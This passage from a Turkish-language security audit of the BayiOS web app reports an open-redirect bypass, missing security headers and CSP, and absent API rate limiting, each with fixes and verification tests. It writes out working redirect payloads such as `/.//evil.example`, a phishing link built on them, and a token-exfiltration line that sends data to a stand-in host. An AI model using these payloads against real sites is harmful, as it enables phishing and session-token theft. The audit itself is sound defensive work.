## 1. Bulgular — ürün açıkları (önce)

### M-1 · Medium · Giriş/kayıt sonrası açık yönlendirme (open redirect) — `safeNextPath` normalizasyon atlatması

- **Konum:** `apps/web/src/lib/auth/routes.ts` `safeNextPath()`; kullananlar `sign-in-form.tsx:25,48` (`router.replace(next)`),
  `sign-up-form.tsx:26,57,67` (e-posta onay bağlantısının `next`'i), `app/auth/callback/route.ts:15,20` (`NextResponse.redirect`).
- **Kök neden:** Kontrol **ham** girdide yapılır (`/` ile başlar, `//` ile başlamaz, `\` içermez), ama dönen değer **normalize
  edilmiş** yoldur. `"/.//evil.example"` ham kontrolü geçer; `new URL(...)` nokta segmentini atar → `pathname = "//evil.example"`
  (origin hâlâ `bayios.invalid`, origin kontrolü de geçer) → fonksiyon `"//evil.example"` döndürür = protokol-göreli dış URL.
  Aynı sonuç: `/x/..//evil.example`, `/%2e//evil.example`.
- **İstismar:** Saldırgan kurbana gerçek alan adında `https://app.bayios…/giris?next=%2F.%2F%2Fevil.example%2Fphish`
  gönderir. Kurban **gerçek** giriş sayfasında kimlik doğrular → tarayıcı `https://evil.example/phish`'e gider (ör. "oturum
  süresi doldu, tekrar girin" sahte sayfası → parola avı). Kayıt akışında `next` onay e-postasındaki
  `/auth/callback?next=…` bağlantısına taşınır; sunucu tarafı `NextResponse.redirect(new URL("//evil.example", …))` 307 ile
  dış siteye yönlendirir (e-posta onaylandıktan, yani oturum kurulduktan hemen sonra).
- **Tekrar üretme (kanıtlandı, 2026-11-07):** üretim derlemesi + mock arka uç, Playwright: `/giris?next=/.//evil.example/phish`
  → e-posta/parola → "Giriş yap" → `page.url() = http://evil.example/phish` (iki varyant: `/.//…`, `/x/..//…`; 2/2). Saf
  fonksiyon: `node` ile `safeNextPath("/.//evil.example") === "//evil.example"`. (Probe dosyası repoya eklenmedi — kurala göre
  başarısız test eklenmez; aşağıdaki doğrulama testi düzeltmeyle birlikte eklenmeli.)
- **Düzeltme:** Normalize edilmiş sonucu yeniden kontrol edin: `const out = url.pathname + url.search + url.hash; return
  out.startsWith("//") || out.startsWith("/\\") ? fallback : out;` (ya da yalnızca bilinen uygulama rotalarına izin verin).
- **Doğrulama testi:** `routes.test.ts` — `"/.//evil.example"`, `"/x/..//evil.example"`, `"/%2e//evil.example"`,
  `"/./\\evil.example"` → `"/pano"`; `auth.spec.ts` — mevcut `//evil.example/x` testinin yanına `/.//evil.example/x` varyantı;
  `auth/callback` için birim testi (redirect `Location` aynı origin).
- **Sahip:** Frontend. Mevcut `auth.spec.ts:31` yalnızca `//evil.example` biçimini test ediyor (geçiyor).

### M-2 · Medium · Web uygulamasında güvenlik başlıkları yok (CSP, çerçeveleme, nosniff, Referrer-Policy)

- **Konum:** `apps/web/next.config.ts` (`headers()` yok), `apps/web/src/proxy.ts` (başlık eklemiyor).
- **Kanıt (üretim derlemesi `next start`, `curl -D -`):** `GET /giris` yanıtında `Content-Security-Policy`,
  `X-Frame-Options` / `frame-ancestors`, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`,
  `Strict-Transport-Security` **yok**; `X-Powered-By: Next.js` **var**.
- **Etki:** (a) Supabase oturumu `@supabase/ssr` tarayıcı istemcisiyle JS'in okuyabildiği çerezde → herhangi bir XSS = erişim +
  yenileme token'ı hırsızlığı. Tehdit modeli §3.1 bunu CSP (nonce) ile karşılamayı öngörüyor; CSP yok. Kodda XSS hedefi
  bulunmadı (`dangerouslySetInnerHTML`, `innerHTML`, `eval` yok — grep), React kaçışlıyor; bu yüzden H değil M.
  (b) Çerçeveleme koruması yok → sipariş onayı / sevkiyat onayı / üye yetkisi gibi tek tıklık eylemlerde clickjacking.
  (c) Tehdit modeli §3.5/T7 `Referrer-Policy: no-referrer` diyor; yok (davet token'ı fragment'te olduğundan Referer'a
  gitmez — bugün somut sızıntı yok).
- **Düzeltme:** `next.config.ts` `headers()`: `X-Frame-Options: DENY` + CSP `frame-ancestors 'none'`, `X-Content-Type-Options:
  nosniff`, `Referrer-Policy: no-referrer` (ya da `strict-origin-when-cross-origin`), `Permissions-Policy: camera=(self)` (barkod
  okutma için kamera gerekiyorsa), `poweredByHeader: false`; `proxy.ts`'de nonce'lu CSP (`script-src 'nonce-…' 'strict-dynamic'`,
  `connect-src` = API + Supabase origin'leri, `object-src 'none'`, `base-uri 'none'`). HSTS barındırıcıda (Vercel varsayılanı)
  veya başlıkla. ESLint: `react/no-danger` kuralı (tehdit modeli §3.1 "lint kuralı CI'da" — şu an tanımlı değil).
- **Doğrulama testi:** Playwright `security-headers.spec.ts`: her genel/uygulama rotasında başlıklar mevcut; CSP'de
  `frame-ancestors 'none'`; `X-Powered-By` yok; sayfa CSP ihlali olmadan çalışır (`page.on("console")` CSP raporu yok).
- **Düzeltme (#160):** `apps/web/next.config.ts` → `next.config.ts` `headers()` (`/:path*`: sayfalar, statik
  dosyalar, 404, proxy yönlendirmeleri) + `poweredByHeader: false`. Üretim derlemesindeki politika (API ve Supabase
  origin'leri derleme anındaki `NEXT_PUBLIC_API_BASE_URL` / `NEXT_PUBLIC_SUPABASE_URL`'den; yalnız origin, yol/sorgu atılır):
  ```
  default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:;
  font-src 'self'; connect-src 'self' <API origin> <Supabase origin>; object-src 'none'; base-uri 'none';
  form-action 'self'; frame-src 'none'; frame-ancestors 'none'; manifest-src 'self'; worker-src 'self';
  upgrade-insecure-requests   (yalnız iki origin de https iken)
  ```
  `next dev`'de `script-src`'e `'unsafe-eval'` eklenir (React hata ayıklaması), üretimde yok. Diğer başlıklar:
  `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer` (tehdit modeli T7),
  `Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), usb=(), serial=(), hid=(), bluetooth=(),
  midi=(), display-capture=(), browsing-topics=(), clipboard-read=(self), clipboard-write=(self)` (web klavye-kama barkod
  okuyucu kullanır, kamera yok; pano yalnız "davet bağlantısını kopyala" için), `Cross-Origin-Opener-Policy: same-origin`,
  `Strict-Transport-Security: max-age=31536000` (http'de tarayıcı yok sayar). ESLint: `react/no-danger`, `no-eval`,
  `no-implied-eval`, `innerHTML`/`outerHTML`/`insertAdjacentHTML` yasak.
- **Neden nonce yok:** Uygulama Cache Components (`cacheComponents: true`, PPR) kullanır: `next build` çıktısında `/auth/callback`
  dışındaki tüm sayfalar derlemede statik (○) üretilir, 9 `[id]` rotası Partial Prerender'dır (◐). Next'in satır içi önyükleme/RSC yük betikleri (`/giris`'te 12
  adet) derleme anında sabittir; istek başına nonce bunlara basılamaz (Next 16 CSP rehberi: "PPR is incompatible with
  nonce-based CSP"). Hash da sağlam değil: betikler rota ve derleme başına değişir, PPR rotaları istek anında ek satır içi
  betik akıtır. Nonce için tüm rotaları dinamik render'a almak (Cache Components'tan vazgeçmek) gerekir — ayrı mimari
  karar. Bu yüzden `script-src 'self' 'unsafe-inline'`: yabancı script origin'i, üretimde `eval`, eklenti, `<base>`
  ele geçirme ve çerçeveleme yok; `connect-src`/`img-src` yalnız uygulama + API + Supabase olduğundan enjekte bir betik
  token'ı `fetch`/`XHR`/görsel işaretiyle yabancı origin'e **gönderemez** (testte kanıtlı: üç kanal da
  `securitypolicyviolation`).
- **Kalan risk (Medium → Low/Medium):** (1) HTML enjeksiyonu bulunursa satır içi betik çalışır (`'unsafe-inline'`); savunma
  React kaçışlaması + lint kuralları. Bir betik **gezinme** ile (`location = "https://evil/?t=…"`) sızdırabilir — CSP gezinmeyi
  sınırlamaz. (2) **Supabase oturum çerezi JS'den okunur ve öyle kalmalı:** `@supabase/ssr` 0.12 `createBrowserClient`
  oturumu `document.cookie`'den okur/yazar (`DEFAULT_COOKIE_OPTIONS.httpOnly = false`) ve web, API'ye tarayıcıdan Bearer
  token'la gider (ADR 0002/0003) — token zaten tarayıcı belleğinde olmak zorundadır. `HttpOnly` yapmak tarayıcı istemcisini
  oturumsuz bırakır (uygulama çalışmaz). Gerçek çözüm BFF (API çağrılarını Next sunucusundan, httpOnly çerezle) — mimari
  değişiklik, bu PR'ın kapsamı dışında. (3) Nonce'a geçiş yolu: Next PPR+nonce desteği gelirse ya da rotalar dinamikleştirilirse
  `headers.ts` nonce'lu `proxy.ts`'e taşınır.

### M-3 · Medium · Genel API rate limit'i yok (tehdit modeli §3.3 D / §6.5)

- **Konum:** `services/api/src/BayiOS.Api/Program.cs` — `AddRateLimiter`/`UseRateLimiter` yok. Yalnızca işletme başına saatlik
  sınırlar var: dosya yükleme (10/saat), dışa aktarma (10/saat), AI ayrıştırma (30/saat) — hepsi testli.
- **Beklenen (tehdit modeli §6.5):** okuma 300/dk, yazma 60/dk (kullanıcı + tenant), aşımda 429 + `Retry-After`.
- **İstismar:** Kayıt açık (`enable_signup = true`); herhangi bir hesap kendi tenant'ını kurar ve pahalı uçları (arama,
  raporlar, sipariş oluşturma) sınırsız çağırır. Veritabanı **tüm tenant'lar arasında paylaşıldığından** bir tenant
  diğerlerinin gecikmesini bozar (gürültülü komşu / DoS). **Ölçüldü** (`docs/testing/load-2026-11.md` §3.1): tek tenant'ın
  ≈ 64 sipariş oluşturma/s yükü, tenant başına tek satırlık boşluksuz sipariş numarası kilidinde konvoy oluşturuyor; 100
  havuz bağlantısının 93'ü kilit bekliyor ve **tüm** istekler (salt okunur arama dahil) p50 3,9 sn / p99 11,5 sn'ye çıkıyor.
  Bunu hiçbir sınır durdurmuyor; tek bir kayıtlı hesap yeter.
- **Düzeltme:** ASP.NET Core `RateLimiter`, `sub` + `X-Tenant-Id` bölümlü token bucket (okuma/yazma ayrı politika), 429 +
  `Retry-After` + `ProblemDetails` (`rate_limit.exceeded`); çoklu instance için Postgres/Redis tabanlı sayaç ya da kenar
  (barındırıcı WAF) limiti. İsteğe bağlı: tenant başına eşzamanlı istek sınırı.
- **Doğrulama testi:** integration — 61. yazma isteği 429 + `Retry-After`; başka tenant/kullanıcı etkilenmez; okuma ve yazma
  kovaları bağımsız.
- **Düzeltildi (#160):** `Platform/RateLimiting/ApiRateLimiting.cs` — ASP.NET Core `PartitionedRateLimiter`, kova
  `(kullanıcı, X-Tenant-Id, okuma|yazma)` + zincirli kullanıcı tavanı (tüm tenant başlıkları, 5 × limit), token bucket
  (kova = dakikalık limit, dakikada tam limit kadar dolar), kuyruk yok; `429` Problem Details `rate_limit.exceeded` +
  `Retry-After`. Kimlik doğrulamadan sonra, **veritabanı işinden önce** çalışır (ilk sürüm tenant doğrulamasından sonraydı;
  tam test koşusunda eşzamanlı istekler sınırlayıcıya varmadan bağlantı beklerken 500 aldı — reddedilecek istek bağlantı
  tutmamalı). Sahte `X-Tenant-Id` döndürmek kullanıcı tavanına takılır. `/health*`, kimliksiz istekler muaf. Yapılandırma `RateLimiting:*`
  (varsayılan 300/60; tasarım ve çoklu instance notu: tehdit modeli §6.5). Test koşum altyapıları (paylaşılan test host'u,
  `tools/load/stack.sh`, `infra/ci/e2e-stack.sh`) limiter açıkken yüksek bütçe verir; demo tohumlayıcı `429`'da
  `Retry-After` kadar bekleyip aynı `Idempotency-Key` ile yeniden dener. **Kilit:** sipariş numarası artık oluşturmanın son
  adımında alınır; 160 it/s'de p99 5,2 sn → 46 ms, havuz doygunluğu yarıya indi, boşluksuzluk korunuyor
  (`docs/testing/load-2026-11.md` §3.2).
- **Kalan risk:** sayaçlar instance belleğinde (üretim tek instance; ölçeklenirken bölünmeli ya da paylaşılan depo); limit
  kullanıcı başınadır — çok kullanıcılı bir tenant toplamda yine yüksek yük üretebilir (tenant toplam/eşzamanlılık sınırı
  açık öneri); 200 it/s üstünde tek tenant'ın numara satırı yine seridir.

### L-1 · Low · API yanıtlarında `X-Content-Type-Options: nosniff` / HSTS yok
